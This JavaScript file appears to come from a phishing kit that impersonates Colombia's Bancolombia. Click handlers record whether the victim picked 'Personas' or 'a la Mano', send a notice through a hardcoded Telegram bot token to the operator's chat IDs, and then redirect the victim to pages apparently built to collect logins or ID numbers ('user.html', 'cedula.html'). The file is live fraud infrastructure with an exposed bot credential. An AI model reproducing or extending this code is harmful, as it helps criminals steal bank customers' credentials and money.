function updateLS() {
  LS.setItem("info", JSON.stringify(info));
}

async function sendDataBC() {
  var message = "";
  var ruta = "";

  if (info.checkerInfo.mode === "personas") {
    message = `🟡 Bancolombia Personas`;
    ruta = "./user.html";
  } else {
    message = `🟡 Bancolombia a la Mano`;
    ruta = "./cedula.html";
  }

  try {
    // Enviar mensaje a cada chat ID
    for (const chatId of chatIds) {
      const url = `https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
        message
      )}`;
      const response = await fetch(url);

      if (response.ok) {
        console.log(`Mensaje enviado a Telegram (Chat ID: ${chatId})`);
      } else {
        console.error(
          `Error al enviar mensaje al Chat ID ${chatId}:`,
          response.statusText
        );
      }
    }

    // Redirigir después de enviar a todos los chats
    window.location.href = ruta;
  } catch (error) {
    console.error("Error de red al enviar mensajes a Telegram:", error);
  }
}

document.getElementById("personas").addEventListener("click", function (e) {
  e.preventDefault();

  info.checkerInfo.mode = "personas";
  updateLS();

  sendDataBC();
});

document.getElementById("mano").addEventListener("click", function (e) {
  e.preventDefault();

  info.checkerInfo.mode = "mano";
  updateLS();

  sendDataBC();
});
